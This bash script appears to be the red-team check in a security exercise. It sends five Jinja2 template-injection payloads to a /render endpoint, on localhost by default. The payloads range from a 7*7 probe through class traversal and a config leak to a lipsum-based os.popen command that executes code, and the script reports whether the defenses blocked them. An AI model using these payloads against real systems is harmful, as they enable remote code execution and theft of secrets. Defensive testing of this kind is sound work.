#!/usr/bin/env bash
# Red team: SSTI via /render — try Jinja2 template injection
# exit 0 = template injection executed code (RED WINS)
# exit 1 = all SSTI attempts blocked (BLUE WINS)
set -u
TARGET_HOST="${TARGET_HOST:-127.0.0.1}"
TARGET_PORT="${TARGET_PORT:-18080}"
BASE="http://${TARGET_HOST}:${TARGET_PORT}/render"
SUCCESS=1

payloads=(
  # basic math proof
  '{{7*7}}'
  # class traversal to subprocess
  '{{"".__class__.__mro__[1].__subclasses__()}}'
  # config leak
  '{{config}}'
  # OS command via Popen
  '{{"".__class__.__mro__[1].__subclasses__()[0].__init__.__globals__}}'
  # lipsum trick
  '{{lipsum.__globals__["os"].popen("id").read()}}'
)

echo "---raw---"
for i in "${!payloads[@]}"; do
  p="${payloads[$i]}"
  resp=$(curl -sS --max-time 4 -X POST "$BASE" --data-urlencode "template=$p" 2>&1) || true
  if echo "$resp" | grep -qE '"rendered":\s*"49"'; then
    echo "PAYLOAD[$i] SSTI_MATH: 7*7=49 executed"
    SUCCESS=0
  elif echo "$resp" | grep -qE 'uid=[0-9]+\(|subprocess|Popen|SECRET_KEY'; then
    echo "PAYLOAD[$i] SSTI_RCE: code execution or config leak"
    SUCCESS=0
  elif echo "$resp" | grep -qE '__class__|__subclasses__'; then
    echo "PAYLOAD[$i] SSTI_INTROSPECT: class traversal returned"
    SUCCESS=0
  else
    echo "PAYLOAD[$i] blocked: ${p:0:60}"
  fi
done
echo "---/raw---"

if [ "$SUCCESS" -eq 0 ]; then
  echo "EVIDENCE: SSTI succeeded — template injection executed on server"
  exit 0
fi
echo "EVIDENCE: all SSTI attempts blocked"
exit 1
